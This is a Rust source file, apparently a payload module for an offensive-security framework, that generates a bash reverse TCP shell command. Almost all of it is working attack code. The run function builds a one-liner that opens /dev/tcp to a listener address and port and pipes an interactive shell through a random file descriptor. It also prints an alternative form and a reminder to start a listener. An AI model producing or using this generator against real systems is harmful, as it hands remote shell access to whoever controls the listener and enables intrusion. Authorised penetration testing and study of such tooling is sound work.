//! Unix Bash Reverse TCP Shell Payload Generator
//!
//! Creates an interactive shell via bash's builtin /dev/tcp.
//! Note: This will not work on circa 2009 and older Debian-based Linux
//! distributions (including Ubuntu) because they compile bash without
//! the /dev/tcp feature.

use amatsumara_api::*;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;
use rand::Rng;

static NAME: &str = "Unix Bash Reverse TCP";
static DESCRIPTION: &str = "Reverse shell via bash /dev/tcp builtin";
static AUTHOR: &str = "Amatsumara Project";
static PLATFORMS: &[Platform] = &[Platform::Linux, Platform::BSD];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86, Arch::ARM64];

static LHOST_NAME: &str = "LHOST";
static LHOST_DESC: &str = "Listener address";
static LHOST_DEFAULT: &str = "127.0.0.1";
static LPORT_NAME: &str = "LPORT";
static LPORT_DESC: &str = "Listener port";
static LPORT_DEFAULT: &str = "4444";
static BASH_PATH_NAME: &str = "BASH_PATH";
static BASH_PATH_DESC: &str = "Path to bash executable";
static BASH_PATH_DEFAULT: &str = "bash";
static SHELL_PATH_NAME: &str = "SHELL_PATH";
static SHELL_PATH_DESC: &str = "Path to shell to spawn";
static SHELL_PATH_DEFAULT: &str = "sh";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: LHOST_NAME.as_ptr() as *const c_char, len: LHOST_NAME.len() },
        description: CString { ptr: LHOST_DESC.as_ptr() as *const c_char, len: LHOST_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: LHOST_DEFAULT.as_ptr() as *const c_char, len: LHOST_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: LPORT_NAME.as_ptr() as *const c_char, len: LPORT_NAME.len() },
        description: CString { ptr: LPORT_DESC.as_ptr() as *const c_char, len: LPORT_DESC.len() },
        required: true,
        option_type: OptionType::Port,
        default_value: CString { ptr: LPORT_DEFAULT.as_ptr() as *const c_char, len: LPORT_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: BASH_PATH_NAME.as_ptr() as *const c_char, len: BASH_PATH_NAME.len() },
        description: CString { ptr: BASH_PATH_DESC.as_ptr() as *const c_char, len: BASH_PATH_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: BASH_PATH_DEFAULT.as_ptr() as *const c_char, len: BASH_PATH_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: SHELL_PATH_NAME.as_ptr() as *const c_char, len: SHELL_PATH_NAME.len() },
        description: CString { ptr: SHELL_PATH_DESC.as_ptr() as *const c_char, len: SHELL_PATH_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: SHELL_PATH_DEFAULT.as_ptr() as *const c_char, len: SHELL_PATH_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Payload,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };
struct ModuleInstance { _dummy: u8 }

#[derive(Deserialize, Debug)]
struct PayloadOptions {
    #[serde(rename = "LHOST")]
    lhost: Option<String>,
    #[serde(rename = "LPORT")]
    lport: Option<String>,
    #[serde(rename = "BASH_PATH")]
    bash_path: Option<String>,
    #[serde(rename = "SHELL_PATH")]
    shell_path: Option<String>,
}

extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void { Box::into_raw(Box::new(ModuleInstance { _dummy: 0 })) as *mut c_void }
extern "C" fn destroy(instance: *mut c_void) { if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut ModuleInstance); } } }

extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    let options: PayloadOptions = match parse_options(config) {
        Ok(opts) => opts,
        Err(e) => { eprintln!("[-] Parse error: {}", e); return 1; }
    };

    let lhost = match options.lhost {
        Some(h) => h,
        None => { eprintln!("[-] LHOST required"); return 1; }
    };

    let lport = match options.lport {
        Some(p) => p,
        None => { eprintln!("[-] LPORT required"); return 1; }
    };

    let bash_path = options.bash_path.unwrap_or_else(|| "bash".to_string());
    let shell_path = options.shell_path.unwrap_or_else(|| "sh".to_string());

    // Use random file descriptor (20-219)
    let fd: u32 = rand::thread_rng().gen_range(20..220);

    // Generate the bash reverse shell payload
    let payload = format!(
        "{} -c '0<&{}-;exec {}<>/dev/tcp/{}/{};{} <&{} >&{} 2>&{}'",
        bash_path, fd, fd, lhost, lport, shell_path, fd, fd, fd
    );

    println!("\n[+] Bash Reverse Shell Payload:");
    println!("    Target: {}:{}", lhost, lport);
    println!("    File Descriptor: {}\n", fd);
    println!("{}", payload);
    println!("\n[*] Alternative (simpler, no semicolons):");
    println!("{} {}<>/dev/tcp/{}/{} <&{} >&{}", bash_path, fd, lhost, lport, fd, fd);
    println!("\n[*] Note: Requires bash compiled with /dev/tcp support");
    println!("[*] Ensure handler is listening: use utilities/multi_handler");

    0
}

fn parse_options(config: *const c_char) -> Result<PayloadOptions, Box<dyn std::error::Error>> {
    if config.is_null() {
        return Ok(PayloadOptions { lhost: None, lport: None, bash_path: None, shell_path: None });
    }
    Ok(serde_json::from_str(unsafe { CStr::from_ptr(config).to_str()? })?)
}

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable { &VTABLE }
